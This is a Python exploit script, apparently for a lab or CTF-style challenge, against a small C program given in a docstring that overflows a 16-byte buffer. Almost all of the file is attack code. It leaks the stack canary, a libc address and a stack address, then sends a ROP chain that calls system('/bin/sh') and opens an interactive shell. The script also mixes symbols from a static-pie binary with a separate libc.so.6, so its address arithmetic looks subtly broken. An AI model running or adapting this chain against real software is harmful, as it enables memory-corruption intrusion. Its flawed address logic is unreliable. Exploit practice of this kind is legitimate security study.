from ptrlib import *

# canaryのリーク
def canary_leak(elf, proc) -> int:
    payload = b'P' * 0x18
    payload += b'P' # カナリー一歩手前
    proc.sendafter("Input (1/4) >> ", payload)
    proc.recv(len("Output : ") + len(payload)) # ゴミ
    leaked = proc.recv(7)
    leaked_canary = int.from_bytes(leaked, byteorder='little')
    return leaked_canary * 0x100


def libc_base_addr_leak(elf, proc) -> int:
    payload = b''
    payload += b'Q' * 8 * 5
    proc.sendafter("Input (2/4) >> ", payload)
    proc.recv(len("Output : ") + len(payload))
    leaked = proc.recv(6)
    leaked_libc_start_main = int.from_bytes(leaked, byteorder='little')
    return leaked_libc_start_main


# スタックアドレスのリークをしたい`saved rbp`を狙う
def stack_addr_leak(elf, proc) -> int: #ここで判明した、アドレス - 312
    payload = b''
    # payload += b'/bin/sh\0' # 8 byte
    payload += b'R' * 8 * 7
    proc.sendafter("Input (3/4) >> ", payload)
    proc.recv(len("Output : ") + len(payload))
    leaked = proc.recv(6)
    leaked_stack_addr = int.from_bytes(leaked, byteorder='little')
    return leaked_stack_addr
 

def rop(elf, proc,leaked_canary, leaked_stack_addr, libc_elf):
    payload = b''
    payload += b'/bin/sh\0' # 8 byte
    payload += b'S' * 16
    payload += p64(leaked_canary);
    payload += b'S' * 8 # saved rbp 
    payload += p64(next(elf.gadget("ret"))) # アラインメント問題の解決用
    payload += p64(next(elf.gadget("pop rdi; ret")))
    payload += p64(leaked_stack_addr)
    payload += p64(libc_elf.symbol("system"))
    proc.sendafter("Input (4/4) >> ", payload)

"""
```bash
<< EOF cat | gcc -static-pie -z lazy -o hard -x c -
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char msg[0x10] = {};

    setbuf(stdout, NULL);

    puts("You can put message 4 times");
    for (int i = 0; i < 4; i++) {
        printf("Input (%d/4) >> ", i + 1);
        read(STDIN_FILENO, msg, 0x70);
        printf("Output : %s\n", msg);
    }
    puts("Bye!");

    return 0;
}
// gcc hard.c -static-pie -o hard
EOF
"""
def main():
    elf = ELF("./hard")
    proc = Process("./hard")

    libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6") # ldd chall_vulnfunc
    input()

    leaked_canary = canary_leak(elf, proc)
    print("leaked_canary", hex(leaked_canary))
    leaked_libc_call_main = libc_base_addr_leak(elf, proc) - 0x68
    offset_libc_call_main = elf.symbol("__libc_start_call_main") # 今回は`-static-pie`でコンパイルされている
    print("leaked_libc_base_addr", hex(leaked_libc_call_main))
    libc_elf.base = leaked_libc_call_main - offset_libc_call_main

    print("start third proc")
    leaked_stack_addr = stack_addr_leak(elf, proc) - 312
    print("leaked stack addr", hex(leaked_stack_addr))

    rop(elf, proc, leaked_canary, leaked_stack_addr, libc_elf)
    proc.interactive()
    

if __name__ == "__main__":
    main()
